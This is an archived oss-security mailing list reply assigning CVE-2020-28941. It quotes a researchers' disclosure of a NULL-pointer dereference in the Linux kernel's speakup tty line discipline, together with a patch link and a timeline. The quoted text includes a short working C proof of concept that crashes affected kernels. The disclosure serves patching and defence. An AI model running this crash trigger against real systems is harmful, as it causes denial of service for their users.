X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2286" "Thursday" "19" "November" "2020" "17:25:08" "+0100" "Marcus Meissner" "meissner@suse.de" "<20201119162507.GA4986@suse.de>" "68" "Re: [oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close" nil nil nil "11" "2020111916:25:08" "[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close" (number mark "U       meissner@sus Nov 19   68/2286  " thread-indent "\"Re: [oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close\"\n") "<CAM1BPE6J_heHs_ckMm5u_Pv6Wnssv_3wgiCNBJs+HLQ+4qkC4A@mail.gmail.com>" ("<CAM1BPE6J_heHs_ckMm5u_Pv6Wnssv_3wgiCNBJs+HLQ+4qkC4A@mail.gmail.com>") nil nil nil nil nil nil nil "Re: [oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 6015 invoked by uid 550); 19 Nov 2020 15:25:30 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5950 invoked from network); 19 Nov 2020 15:25:29 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Date: Thu, 19 Nov 2020 17:25:08 +0100
From: Marcus Meissner <meissner@suse.de>
To: oss-security@lists.openwall.com
Cc: nopitydays@gmail.com
Message-ID: <20201119162507.GA4986@suse.de>
References: <CAM1BPE6J_heHs_ckMm5u_Pv6Wnssv_3wgiCNBJs+HLQ+4qkC4A@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <CAM1BPE6J_heHs_ckMm5u_Pv6Wnssv_3wgiCNBJs+HLQ+4qkC4A@mail.gmail.com>
Organization: SUSE Software Solutions =?iso-8859-1?Q?Ger?=
 =?iso-8859-1?Q?many_GmbH=2C_Maxfeldstr=2E_5=2C_90409_Nuernberg=2C_Germany?=
 =?iso-8859-1?Q?=2C_GF=3A_Felix_Imend=F6rffer=2C_HRB_36809=2C_AG_N=FCrnber?=
 =?iso-8859-1?Q?g?=
User-Agent: Mutt/1.10.1 (2018-07-13)
Subject: Re: [oss-security] Linux kernel NULL-ptr deref bug in
 spk_ttyio_ldisc_close

Hi,

Mitre has assigned CVE-2020-28941 to this issue.

Ciao, Marcus
On Thu, Nov 19, 2020 at 10:46:59AM +0800, Shisong Qin wrote:
> Hi,
> 
> Recently we found a NULL-ptr deref BUG in spk_ttyio.c in the longterm 4.19
> Linux kernel, and it could also be triggered in the 5.9 Linux kernel. In
> function spk_ttyio_ldisc_close, it would free the "speakup_tty->disc_data"
> and set "speakup_tty" to NULL. However, if we open two tty device and use
> tiocsetd() to set them as "speakup_tty" and close them in turn, the first
> close would set "speakup_tty" to NULL, and in the second close would try to
> dereference the "speakup_tty", leading to a NULL-ptr deref crash.
> 
> This bug could be reproduced in the longterm 4.19 Linux kernel with
> CONFIG_STAGING=y, CONFIG_SPEAKUP=y and CONFIG_KASAN=y.
> To reproduce it in the 5.9 Linux kernel, CONFIG_ACCESSIBILITY=y is also
> required in config, and here is a simple poc:
> 
> #define _GNU_SOURCE
> 
> #include <dirent.h>
> #include <endian.h>
> #include <errno.h>
> #include <fcntl.h>
> #include <signal.h>
> #include <stdarg.h>
> #include <stdbool.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/prctl.h>
> #include <sys/stat.h>
> #include <sys/syscall.h>
> #include <sys/types.h>
> #include <sys/wait.h>
> #include <time.h>
> #include <unistd.h>
> 
> int main(void) {
>     int disc = 0x1a;
>     int fd = open("/dev/ptmx", O_RDWR, 0);
>     ioctl(fd, 0x5423, &disc);
>     int fd2 = open("/dev/ptmx", O_RDWR, 0);
>     ioctl(fd2, 0x5423, &disc);
>     return 0;
> }
> 
> After the process return, it seems the automated calling to release would
> trigger the NULL-ptr deref bug.
> 
> Here is the commit to patch this BUG:
> https://git.kernel.org/pub/scm/linux/kernel/git/gregkh/tty.git/commit/?h=tty-linus&id=d4122754442799187d5d537a9c039a49a67e57f1
> 
> Timeline:
> * 2020/11/10 - Vulnerability reported to security@kernel.org
> * 2020/11/11 - Vulnerability confirmed, and reported to
> linux-distros@vs.openwall.org.
> * 2020/11/19 - Vulnerability opened.
> 
> Thanks,
> Shisong Qin and Bodong Zhao, Tsinghua University

-- 
Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@suse.de>
